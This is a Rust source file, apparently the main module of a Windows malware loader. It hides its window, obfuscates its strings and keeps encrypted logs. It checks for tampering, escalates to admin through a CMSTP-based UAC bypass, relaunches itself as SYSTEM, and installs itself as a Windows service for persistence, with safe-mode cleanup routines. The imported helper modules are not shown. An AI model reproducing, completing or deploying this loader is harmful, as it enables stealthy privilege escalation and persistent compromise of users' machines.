#![windows_subsystem = "windows"]

use lazy_static::lazy_static;
use loader_vars::constants::{ system_log_directory, initial_log_directory };
use safemode::{ runner::clean_up, utils::{ is_safe_mode, safemode_fail_safe } };
use service::utils::install_initial_service;
use shared::{
    constants::logs_encryption_key,
    logs::logger::Logger,
    uac::{
        checks::{ is_elevated, is_system },
        impersonate_admin::{ open_self_as_admin, try_kill_cmstp },
    },
    utils::{
        anti_tampering::is_clean,
        functions::{
            exit_1,
            exit_1_insta,
            get_current_exe,
            is_running_from_system32,
            try_spawn_program_as_system,
        },
    },
};
use windows_service_detector::is_running_as_windows_service;
use std::{ sync::Mutex, thread, time::Duration };
use obfstr::obfstr as s;

mod service;
mod safemode;

lazy_static! {
    pub static ref LOGGER: Mutex<Option<Logger>> = Mutex::new(None);
}

#[macro_export]
macro_rules! log_internal {
    ($level:expr, $s:expr) => {
        {
        match &*$crate::LOGGER.lock().unwrap() {
            Some(logger) => {
                logger.log($level, s!($s));
                // println!("{:#?}",$s);
            }
            None => {}
        }
        }
    };

    (
        $level:expr,
        $fmt:expr,
        $($arg:tt)*
    ) => {
        {
            match &*$crate::LOGGER.lock().unwrap() {
                Some(logger) => {
                logger.log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
                // println!("{}{:#?}", $fmt, $($arg)*);
            }
            None => {}
        }
        }
    };
}
#[macro_export]
macro_rules! info {
    ($s:expr) => {
        crate::log_internal!(s!("INFO"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("INFO"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! warn {
    ($s:expr) => {
        $crate::log_internal!(s!("WARN"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("WARN"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! err {
    ($s:expr) => {
        $crate::log_internal!(s!("ERROR"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
           $crate::log_internal!(s!("ERROR"), $fmt, $($arg)*
        )
    };
}
#[macro_export]
macro_rules! verbose {
    ($s:expr) => {
        $crate::log_internal!(s!("VERBOSE"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("VERBOSE"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! tag {
    ($s:expr) => {
        $crate::log_internal!(s!("TAG"), $s)
    };
}

fn main() {
    let is_running_from_system_dir = is_running_from_system32();
    let log_directory = if is_running_from_system_dir {
        system_log_directory()
    } else {
        initial_log_directory()
    };
    if let Ok(logger) = Logger::new(log_directory.clone(), logs_encryption_key()) {
        let mut lock = LOGGER.lock().unwrap();
        *lock = Some(logger);
    }
    info!("Init");

    if !is_clean() {
        tag!("NOT-CLEAN");
        exit_1();
    }

    if
        !is_elevated().unwrap_or_else(|error| {
            err!("is_elevated Error, assuming false: ", error);
            false
        })
    {
        tag!("ELEVATE");

        if let Err(error) = open_self_as_admin() {
            err!("open_self_as_admin Error: ", error);
        }
        exit_1();
    }
    let is_system = is_system().unwrap_or_else(|error| {
        err!("is_system Error, assuming false: ", error);
        false
    });
    if is_safe_mode() {
        if is_system {
            tag!("CLEANUP");
            if let Err(error) = clean_up() {
                err!("clean_up Error: ", error);
                safemode_fail_safe();
            }
        } else {
            //! This should be in service runner
            tag!("LAUNCH-CLEANUP");
            if
                let Err(error) = try_spawn_program_as_system(
                    get_current_exe().to_str().unwrap(),
                    None
                )
            {
                err!("spawn_program_as_system Error: ", error);
                safemode_fail_safe();
            } else {
                let fail_safe_thread = thread::spawn(move || {
                    let fail_safe_seconds = 8;
                    thread::sleep(Duration::from_secs(fail_safe_seconds));
                    warn!("FAIL SAFE TIMEOUT");
                    safemode_fail_safe();
                });
                let _ = fail_safe_thread.join();
                exit_1_insta();
            }
        }
    }

    let is_service = is_running_as_windows_service().unwrap_or_else(|error| {
        err!("is_running_as_windows_service Error, assuming true:", error);
        true
    });
    if is_service {
        //! TODO
    } else {
        if is_running_from_system_dir {
            if is_system {
                tag!("SYS-SERVICE-INSTALL");
                //! TODO
            } else {
                tag!("LAUNCH-SYS-SERVICE-INSTALL");
                if
                    let Err(error) = try_spawn_program_as_system(
                        get_current_exe().to_str().unwrap(),
                        None
                    )
                {
                    err!("try_spawn_program_as_system Error: ", error);
                }
                exit_1();
            }
        } else {
            tag!("INITIAL-SERVICE-INSTALL");

            let cmstp_cleanup_handle = thread::spawn(move || {
                if let Err(error) = try_kill_cmstp() {
                    err!("try_kill_cmstp Error: ", error);
                }
            });
            if let Err(error) = install_initial_service() {
                err!("install_initial_service Error: ", error);
            }

            let _ = cmstp_cleanup_handle.join();
            exit_1();
        }
    }
}
